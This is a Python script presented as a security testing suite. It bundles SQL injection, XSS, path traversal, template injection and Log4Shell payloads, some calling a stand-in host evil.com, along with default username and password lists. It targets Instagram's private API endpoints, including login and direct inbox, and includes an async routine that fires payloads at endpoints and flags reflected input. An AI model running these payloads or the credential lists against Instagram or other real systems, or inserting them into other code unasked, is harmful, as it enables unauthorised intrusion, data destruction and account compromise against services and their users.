#!/usr/bin/env python3
"""
🔥 Payload Generator - Inspired by PayloadsAllTheThings
สร้าง payload สำหรับ testing และ security research
"""

import asyncio
import aiohttp
import logging
import json
import random
from typing import List, Dict
from pathlib import Path

class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM users) > 0--"
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>"
            ],
            "instagram_api_fuzzing": [
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
                "';exec master..xp_cmdshell 'ping evil.com'--"
            ],
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Instagram 276.0.0.27.98 Android"
            ]
        }
    
    def get_random_payload(self, payload_type: str) -> str:
        """🎲 Get random payload of specified type"""
        if payload_type in self.payloads:
            return random.choice(self.payloads[payload_type])
        return ""
    
    def generate_fuzzing_data(self, base_data: Dict, fuzz_fields: List[str]) -> List[Dict]:
        """🔀 Generate fuzzing variations of data"""
        variations = []
        
        for field in fuzz_fields:
            if field in base_data:
                for payload_type in ["sql_injection", "xss_payloads", "instagram_api_fuzzing"]:
                    for payload in self.payloads[payload_type]:
                        fuzzed_data = base_data.copy()
                        fuzzed_data[field] = payload
                        fuzzed_data["_fuzz_type"] = payload_type
                        fuzzed_data["_fuzz_field"] = field
                        variations.append(fuzzed_data)
        
        return variations

class SecurityTester:
    def __init__(self, session_id: str):
        self.session_id = session_id
        self.payload_gen = PayloadGenerator()
        
    async def test_endpoint_security(self, session: aiohttp.ClientSession, endpoint: str) -> Dict:
        """🛡️ Test endpoint for security vulnerabilities"""
        logging.info(f"🔍 Testing security for: {endpoint}")
        
        results = {
            "endpoint": endpoint,
            "tests_performed": 0,
            "vulnerabilities_found": [],
            "test_timestamp": asyncio.get_event_loop().time()
        }
        
        # Test different payloads
        for payload_type in ["sql_injection", "xss_payloads"]:
            payload = self.payload_gen.get_random_payload(payload_type)
            
            try:
                test_url = f"{endpoint}?test_param={payload}"
                async with session.get(test_url) as response:
                    results["tests_performed"] += 1
                    
                    # Check for potential vulnerabilities
                    response_text = await response.text()
                    
                    if payload in response_text:
                        results["vulnerabilities_found"].append({
                            "type": "reflected_payload",
                            "payload_type": payload_type,
                            "payload": payload,
                            "response_code": response.status
                        })
                        logging.warning(f"⚠️ Potential {payload_type} vulnerability found!")
                        
            except Exception as e:
                logging.error(f"❌ Error testing {payload_type}: {e}")
        
        return results

# Wordlist Generator - Inspired by SecLists
class WordlistGenerator:
    def __init__(self):
        self.common_usernames = [
            "admin", "administrator", "root", "user", "test",
            "guest", "demo", "support", "service", "operator"
        ]
        
        self.common_passwords = [
            "password", "123456", "admin", "letmein", "welcome",
            "password123", "admin123", "root", "toor", "pass"
        ]
        
        self.instagram_endpoints = [
            "/api/v1/accounts/login/",
            "/api/v1/users/info/",
            "/api/v1/direct_v2/inbox/",
            "/api/v1/feed/timeline/",
            "/api/v1/media/{media_id}/info/"
        ]
    
    def generate_username_variations(self, base_username: str) -> List[str]:
        """👤 Generate username variations for testing"""
        variations = [base_username]
        
        # Add common suffixes/prefixes
        prefixes = ["admin_", "test_", "_"]
        suffixes = ["_admin", "_test", "123", "_backup"]
        
        for prefix in prefixes:
            variations.append(f"{prefix}{base_username}")
        
        for suffix in suffixes:
            variations.append(f"{base_username}{suffix}")
        
        return variations
    
    def generate_endpoint_variations(self, base_endpoint: str) -> List[str]:
        """🔗 Generate endpoint variations for directory fuzzing"""
        variations = [base_endpoint]
        
        # Add common variations
        common_variations = [
            f"{base_endpoint}.php",
            f"{base_endpoint}.html",
            f"{base_endpoint}_backup",
            f"{base_endpoint}_old",
            f"{base_endpoint}~"
        ]
        
        variations.extend(common_variations)
        return variations

# Main async function
async def main():
    print("🔥 SECURITY TESTING SUITE")
    print("=" * 50)
    
    # Initialize components
    payload_gen = PayloadGenerator()
    wordlist_gen = WordlistGenerator()
    
    # Example usage
    print("🎲 Random SQL Injection payload:", payload_gen.get_random_payload("sql_injection"))
    print("🎲 Random XSS payload:", payload_gen.get_random_payload("xss_payloads"))
    
    print("\n👤 Username variations for 'admin':")
    for username in wordlist_gen.generate_username_variations("admin")[:5]:
        print(f"   - {username}")
    
    print("\n🔗 Endpoint variations for '/api/login':")
    for endpoint in wordlist_gen.generate_endpoint_variations("/api/login")[:5]:
        print(f"   - {endpoint}")
    
    # Fuzzing example
    base_data = {"username": "test", "password": "pass"}
    fuzz_fields = ["username", "password"]
    fuzzed_data = payload_gen.generate_fuzzing_data(base_data, fuzz_fields)
    
    print(f"\n🔀 Generated {len(fuzzed_data)} fuzzing variations")
    print("📋 Example fuzzed data:")
    for i, data in enumerate(fuzzed_data[:3]):
        print(f"   {i+1}. {data}")

if __name__ == "__main__":
    asyncio.run(main())
